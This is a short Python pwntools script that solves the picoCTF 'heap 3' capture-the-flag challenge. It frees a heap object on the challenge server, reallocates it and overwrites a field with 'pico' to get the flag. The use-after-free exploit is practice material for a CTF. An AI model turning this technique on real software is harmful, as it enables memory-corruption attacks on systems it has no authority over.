# picoCTF-heap-3-exploit.py
# by Aidan Wech (ahwech)
# nc tethys.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "tethys.picoctf.net"
    port = 56367

    # variables
    heap_size = 40
    offset = 30
    payload = flat({
        offset: "pico"
    })

    # connect to instance and deliver payload
    p = remote(host, port)

    # free object
    p.recvuntil(b"choice: ", timeout=1)
    p.sendline(b"5")

    # reallocate object, overwrite flag
    p.recvuntil(b"choice: ", timeout=1)
    p.sendline(b"2")
    p.recvuntil(b"allocation: ", timeout=1)
    p.sendline(f"{heap_size}".encode())
    p.recvuntil(b"flag: ", timeout=1)
    p.sendline(payload)

    # obtain flag
    p.recvuntil(b"choice: ", timeout=1)
    p.sendline(b"4")
    p.recvline(timeout=1)
    flag = p.recvline(timeout=1).decode().rstrip("\n")
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()